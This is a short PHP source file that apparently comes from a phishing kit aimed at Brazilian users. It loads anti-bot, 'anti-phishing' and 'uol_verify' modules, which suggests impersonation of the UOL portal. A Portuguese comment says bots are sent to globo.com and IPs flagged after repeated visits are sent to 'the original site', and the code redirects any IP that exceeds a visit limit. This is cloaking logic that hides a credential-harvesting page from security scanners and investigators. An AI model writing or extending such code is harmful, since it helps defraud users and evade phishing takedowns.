<?php
declare(strict_types=1);

/** Anti-bot + geo BR. Bots -> globo.com; IP bloqueado por tentativas -> site original. */
function enforce_public_access(array $config): void
{
    require_once __DIR__ . '/anti_bot.php';
    require_once __DIR__ . '/anti_phishing.php';
    anti_phishing_enforce($config);
    anti_bot_enforce($config);
    enforce_ip_page_limit($config);
}

function enforce_ip_page_limit(array $config): void
{
    $max = (int) ($config['max_ip_visits'] ?? 0);
    if ($max <= 0) {
        return;
    }

    require_once __DIR__ . '/storage.php';
    require_once __DIR__ . '/uol_verify.php';

    $storage = new Storage($config['data_dir']);
    $ip = client_ip();
    $redirect = uol_blocked_redirect($config);

    if (!$storage->trackIpPageHit($ip, $max)) {
        header('Location: ' . $redirect, true, 302);
        exit;
    }
}
